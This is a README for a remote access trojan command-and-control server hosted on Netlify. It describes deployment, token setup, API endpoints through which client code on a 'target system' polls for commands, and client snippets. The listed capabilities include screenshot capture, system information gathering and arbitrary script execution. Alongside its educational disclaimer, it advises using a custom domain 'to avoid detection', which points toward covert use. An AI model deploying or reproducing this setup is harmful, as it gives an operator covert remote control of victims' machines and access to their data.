# Rat C2 Server for Netlify

A Command & Control (C2) server designed for Netlify deployment, providing remote access capabilities for security testing and educational purposes.

## ⚠️ WARNING

This tool is designed for **educational purposes and authorized security testing only**. Using this tool on systems without explicit permission is illegal and unethical. Always obtain proper authorization before conducting any security testing.

## Features

- **Serverless Architecture**: Runs on Netlify Functions (no server maintenance)
- **RESTful API**: Clean HTTP-based C2 communication
- **Real-time Communication**: Heartbeat mechanism for active clients
- **Command Queue**: Store and retrieve commands for clients
- **Response Collection**: Gather command execution results
- **Web Interface**: User-friendly controller dashboard
- **Authentication**: Token-based access control

## Architecture

```
┌─────────────────┐    HTTP     ┌─────────────────┐
│   Rat Client    │ ◄─────────► │  Netlify C2     │
│ (Target System) │             │  Server         │
└─────────────────┘             └─────────────────┘
                                        ▲
                                        │
                                        ▼
                               ┌─────────────────┐
                               │   Controller     │
                               │   (Web UI)       │
                               └─────────────────┘
```

## Setup

### 1. Deploy to Netlify

```bash
# Install dependencies
npm install

# Deploy to Netlify
netlify login
netlify link
netlify deploy --prod
```

### 2. Configure Environment Variables

In your Netlify dashboard, set these environment variables:

```
AUTH_TOKEN=your-secure-auth-token-here
```

### 3. Access the Controller

- **Controller UI**: `https://your-site.netlify.app/controller.html`
- **API Endpoints**: 
  - Heartbeat: `/.netlify/functions/heartbeat`
  - Commands: `/.netlify/functions/command`
  - Responses: `/.netlify/functions/response`

## API Endpoints

### Heartbeat (Client → Server)
```
GET /.netlify/functions/heartbeat
Headers:
  X-Client-ID: unique-client-identifier
  Authorization: Bearer your-auth-token
```

### Queue Command (Controller → Server)
```
POST /.netlify/functions/command
Headers:
  Authorization: Bearer your-auth-token
Body:
{
  "clientId": "target-client-id",
  "command": "system_info",
  "parameters": {}
}
```

### Submit Response (Client → Server)
```
POST /.netlify/functions/response
Body:
{
  "clientId": "client-id",
  "commandId": "command-uuid",
  "result": {...},
  "error": null
}
```

## Client Implementation

### Browser Client
```javascript
const client = new RatClient('https://your-site.netlify.app', 'client-1', 'your-token');
client.startHeartbeat();
```

### Node.js Client
```javascript
const RatClient = require('./client.js');
const client = new RatClient('https://your-site.netlify.app', 'client-1', 'your-token');
client.startHeartbeat();
```

## Available Commands

- `system_info`: Gather system information
- `screenshot`: Capture screen (browser only)
- `ping`: Test connectivity
- `custom_script`: Execute custom JavaScript

## Security Considerations

1. **Authentication**: Always use strong, unique AUTH_TOKEN
2. **HTTPS**: Netlify automatically provides SSL/TLS
3. **Rate Limiting**: Consider implementing rate limiting for production
4. **Logging**: Monitor access logs for suspicious activity
5. **Domain**: Use custom domain to avoid detection

## Development

```bash
# Local development
npm run dev

# Test functions locally
netlify functions:serve
```

## File Structure

```
├── netlify/
│   └── functions/
│       ├── heartbeat.js    # Client heartbeat endpoint
│       ├── command.js      # Command queue endpoint
│       └── response.js     # Response collection endpoint
├── client.js               # Client implementation
├── controller.html         # Web controller interface
├── netlify.toml           # Netlify configuration
├── package.json           # Dependencies
└── README.md              # This file
```

## Legal Disclaimer

This software is provided for educational and authorized security testing purposes only. The authors are not responsible for any misuse of this software. Users must comply with all applicable laws and regulations.

## License

MIT License - See LICENSE file for details.
